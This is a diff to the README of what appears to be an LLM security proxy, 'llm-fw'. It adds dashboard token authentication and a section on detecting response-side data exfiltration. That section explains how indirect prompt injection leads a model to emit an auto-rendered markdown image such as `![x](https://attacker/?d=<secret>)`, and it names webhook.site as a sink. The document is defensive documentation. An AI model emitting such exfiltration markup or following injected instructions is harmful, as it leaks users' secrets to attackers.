@@ -288,8 +288,11 @@ All clients' traffic now appears in the server dashboard's **Live Traffic** tab,
 | --- | --- | --- | --- |
 | Proxy bind | `127.0.0.1` | `0.0.0.0` | `LLM_FW_PROXY_BIND` |
 | Dashboard bind | `127.0.0.1` | `0.0.0.0` | `LLM_FW_DASHBOARD_BIND` |
+| Dashboard token | _(none)_ | auto-generated | `LLM_FW_DASHBOARD_TOKEN` |
 
-> ⚠️ **The proxy becomes reachable by any host that can route to the server.** Run it only on a trusted network, or restrict access with a firewall rule. The dashboard (which shows request payloads) is exposed too — keep it local-only while still sharing the proxy with `LLM_FW_DASHBOARD_BIND=127.0.0.1`.
+> ⚠️ **The proxy becomes reachable by any host that can route to the server.** Run it only on a trusted network, or restrict access with a firewall rule.
+
+**Dashboard authentication.** The dashboard shows captured request payloads and exposes the live defense toggles, so non-local access is gated by a shared token. The operator on the **same machine (loopback) always has access with no token**. Any **remote** client must present the token as `Authorization: Bearer <token>` (or HTTP Basic with the token as the password — browsers are prompted natively). Set it via `LLM_FW_DASHBOARD_TOKEN`; if the dashboard is bound non-locally and no token is configured, one is **auto-generated and printed at startup** so a standalone dashboard is never left open. The CA-download endpoints (`/ca.crt`, `/crl`) stay public so clients can bootstrap trust.
 
 ---
 
@@ -833,9 +836,40 @@ Environment overrides:
 
 ---
 
+## Response-Side Exfiltration Detection
+
+Input-side detection stops a poisoned prompt going *in*; this stops stolen data coming *out*. A model whose context was poisoned (indirect injection) commonly exfiltrates by emitting markup the **client auto-renders** — the classic zero-click vector is a markdown image, `![x](https://attacker/?d=<secret>)`, which the chat UI fetches immediately, leaking the query string with no user click. Links are the one-click variant.
+
+`llm-fw` scans the **model's response** for markdown/HTML image and link URLs and runs each destination through the same URL classifier used for outbound requests (allowlist, known-sink list, DGA and path-exfil heuristics — so an image to an allowlisted CDN is fine, one to `webhook.site` is not). It is provider-agnostic (scans the decoded response text) and works on **compressed responses** too: the proxy now gunzip/brotli/deflate-decodes inspected JSON bodies before scanning (previously compressed bodies skipped inspection).
+
+- **audit** (default) — emit an event and forward unchanged.
+- **block** — additionally neutralize the offending URL in buffered (non-streaming) JSON responses, replacing it with an inert placeholder so the agent still gets a valid turn without the auto-fetch. Streaming (SSE) responses are audited (already-sent bytes can't be retracted).
+
+Events appear on the dashboard under the **Response Exfil** badge with a `response-exfil` stage chip.
+
+### Configuration
+
+```json
+{
+  "responseScan": {
+    "enabled": true,
+    "mode": "audit"
+  }
+}
+```
+
+Environment overrides:
+
+| Variable | Effect |
+|----------|--------|
+| `LLM_FW_RESPONSE_SCAN_ENABLED` | `true`/`false` — enable or disable response-side exfil scanning |
+| `LLM_FW_RESPONSE_SCAN_MODE` | `audit` \| `block` |
+
+---
+
 ## Settings — toggle defenses live
 
-The dashboard's **Settings** tab lets you enable or disable each defense (attack type) at runtime: prompt-injection judge modes, ASCII smuggling, RAG poisoning, DLP (and mode), MCP tool policy + command-guardrail categories A–D, URL/exfil filter, cross-turn taint (and mode), and rate-limit/DoS breakers.
+The dashboard's **Settings** tab lets you enable or disable each defense (attack type) at runtime: prompt-injection judge modes, ASCII smuggling, RAG poisoning, DLP (and mode), response-side exfil scan (and mode), MCP tool policy + command-guardrail categories A–D, URL/exfil filter, cross-turn taint (and mode), and rate-limit/DoS breakers.
 
 Toggles take effect on the **next proxy request** — the dashboard and proxy share one in-memory config in the same process, and every defense now reads its `enabled` flag per-request, so there is no restart. Changes are persisted to `~/.llm-fw/config.json` (deep-merged, so unrelated keys like `proxy.mode` are preserved) and survive restarts.
 
